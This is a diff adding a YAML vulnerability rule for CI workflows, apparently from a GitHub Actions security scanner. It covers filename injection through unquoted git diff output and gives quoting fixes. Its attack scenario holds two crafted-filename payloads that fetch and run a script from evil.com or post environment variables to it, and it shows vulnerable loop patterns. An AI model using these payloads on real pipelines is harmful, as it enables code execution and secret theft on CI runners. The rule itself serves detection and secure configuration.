@@ -1,0 +1,101 @@
+id: VXS-003
+name: "Filename Injection via Git Diff or File Listing"
+severity: high
+description: >
+  A `run:` block iterates over filenames obtained from git commands (such as
+  `git diff --name-only`, `git log --diff-filter`, `find`, or `ls`) and uses
+  `${{ }}` expression interpolation or improper quoting when processing those
+  filenames. Filenames in a pull request are controlled by the PR author and can
+  contain shell metacharacters, newlines, backticks, dollar signs, semicolons,
+  and other injection payloads. When these filenames are interpolated into shell
+  commands without proper quoting, they can lead to arbitrary command execution
+  on the runner. Even without `${{ }}` interpolation, improper handling of
+  filenames from git output in shell loops (e.g., unquoted `for f in $(git diff
+  --name-only)`) can lead to word splitting and glob expansion attacks.
+
+tags:
+  - injection
+  - filename-injection
+
+attack_scenario: >
+  An attacker submits a pull request that adds or modifies a file with a crafted
+  filename such as `$(curl https://evil.com/pwn.sh | bash).txt` or
+  `file"; curl https://evil.com -d "$(env)"; echo ".js`. The target repository's
+  CI workflow runs `git diff --name-only` to get the list of changed files and then
+  processes each filename in a shell loop or passes them to a linting/testing command.
+  If the filename is not properly quoted, the shell interprets the metacharacters in
+  the filename as commands. The attacker achieves code execution on the CI runner and
+  can exfiltrate secrets, modify build outputs, or compromise the repository. This
+  attack is particularly insidious because code reviewers focus on file contents, not
+  filenames, making the malicious payload easy to overlook.
+
+real_world_incident: >
+  In 2024, researchers demonstrated filename injection attacks against several CI/CD
+  pipelines including Datadog's open-source projects. The attack leveraged the fact
+  that CI workflows commonly iterate over changed filenames using `git diff --name-only`
+  output in unquoted shell loops. By crafting filenames with embedded shell commands,
+  attackers could achieve arbitrary code execution in the CI environment. This class
+  of vulnerability was highlighted by GitHub Security Lab as a common but often
+  overlooked injection vector in GitHub Actions workflows.
+
+fix: |
+  **Option 1 (Preferred): Use null-delimited output and proper quoting.**
+
+  ```yaml
+  - run: |
+      # SAFE: Use -z for null-delimited output, read with proper delimiter
+      git diff --name-only -z HEAD~1 HEAD | while IFS= read -r -d '' file; do
+        echo "Processing: ${file}"
+        eslint -- "${file}"
+      done
+  ```
+
+  **Option 2: Use xargs with null delimiter.**
+
+  ```yaml
+  - run: |
+      # SAFE: Null-delimited piping prevents filename injection
+      git diff --name-only -z HEAD~1 HEAD | xargs -0 -I {} eslint -- "{}"
+  ```
+
+  **Option 3: Use GitHub's built-in file matching instead of shell commands.**
+
+  ```yaml
+  # SAFE: Let the action handle file matching instead of shell globbing
+  - uses: dorny/paths-filter@v3
+    id: changes
+    with:
+      filters: |
+        src:
+          - 'src/**'
+  ```
+
+  **Patterns to avoid:**
+
+  ```yaml
+  # DANGEROUS: Unquoted command substitution with word splitting
+  - run: |
+      for f in $(git diff --name-only HEAD~1 HEAD); do
+        echo "Linting $f"
+        eslint $f
+      done
+
+  # DANGEROUS: Direct interpolation of filenames
+  - run: |
+      FILES="${{ steps.changed.outputs.files }}"
+      eslint $FILES
+
+  # DANGEROUS: Pipe to while without null termination
+  - run: |
+      git diff --name-only HEAD~1 HEAD | while read f; do
+        process "$f"  # Breaks on filenames with newlines
+      done
+  ```
+
+  **Key principles:**
+  - Always use `-z` / `--null` flags with git commands for null-delimited output
+  - Always quote variable expansions: `"${file}"` not `$file`
+  - Never use `${{ }}` interpolation with file lists in `run:` blocks
+  - Prefer dedicated actions over shell-based file iteration
+
+references: []
